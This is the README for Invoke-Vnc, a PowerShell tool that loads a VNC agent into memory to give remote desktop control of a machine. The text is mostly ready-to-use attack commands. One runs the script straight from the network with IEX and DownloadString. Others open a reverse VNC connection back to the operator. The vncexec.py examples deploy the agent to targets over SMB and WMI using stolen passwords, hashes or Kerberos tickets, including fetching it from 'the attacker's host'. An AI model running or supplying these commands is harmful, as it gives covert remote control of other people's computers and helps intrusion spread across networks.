Invoke-Vnc - a powershell VNC injector
===================

Invoke-Vnc executes a VNC agent in-memory and initiates a reverse connection, or binds to a specified port. Password authentication is supported.

Usage example
------------------

Invoke locally:
```powershell
Import-Module Invoke-Vnc.ps1
#Reverse VNC connection
Invoke-Vnc -ConType reverse -IpAddress <backconnect_ip> -Port 5500 -Password P@ssw0rd
#Bind VNC connection
Invoke-Vnc -ConType bind -Port 5900 -Password P@ssw0rd
```

Invoke over net:
```powershell
IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/artkond/Invoke-Vnc/master/Invoke-Vnc.ps1')
#Reverse VNC connection
Invoke-Vnc -ConType reverse -IpAddress <backconnect_ip> -Port 5500 -Password P@ssw0rd
#Bind VNC connection
Invoke-Vnc -ConType bind -Port 5900 -Password P@ssw0rd
```

Launch VNC listener to catch reverse VNC connection:
```
vncviewer –listen <port>
```

Execute agent remotely via WMI
--------------------------
If you have authenticated access (password, nt hash or kerberos ticket) to the machine, you can use the vncexec.py script to execute the VNC agent.

Upload an encoded ps1 script as a bat file via SMB and execute the agent to bind a VNC port on target:
```
vncexec.py -invoke-vnc-path Invoke-Vnc.ps1 -contype bind -vncport 5900 -vncpass P@ssw0rd -method upload user:pass@target_ip
```
Download the script via HTTP from the attacker's host and execute the agent to get a reverse VNC connection:
```
vncexec.py -bc-ip <attacker's_host> -httpport 8080 -invoke-vnc-path Invoke-Vnc.ps1 -contype reverse -vncport 5500 -vncpass P@ssw0rd -method download user:pass@target_ip
```

Script depends on a recent build of impacket library. Get it at https://github.com/CoreSecurity/impacket
```
git clone https://github.com/CoreSecurity/impacket
cd impacket
sudo python setup.py install
```

Build notes
----------
Project is built using Visual Studio 2013. To successfully build the solution you need python to be available at C:\Python27\python.exe. Both x86 and x64 configurations must be built in order to update Invoke-Vnc.ps1 script.


To-do
--------
- Fix session tracking


Author
------

Artem Kondratenko https://twitter.com/artkond


Credit
------
Repo is based on the following projects:

- https://github.com/rapid7/metasploit-framework/tree/master/external/source/vncdll
- https://github.com/CoreSecurity/impacket/tree/master/examples
- https://github.com/stephenfewer/ReflectiveDLLInjection
- https://github.com/PowerShellMafia/PowerSploit/blob/master/CodeExecution/Invoke-ReflectivePEInjection.ps1
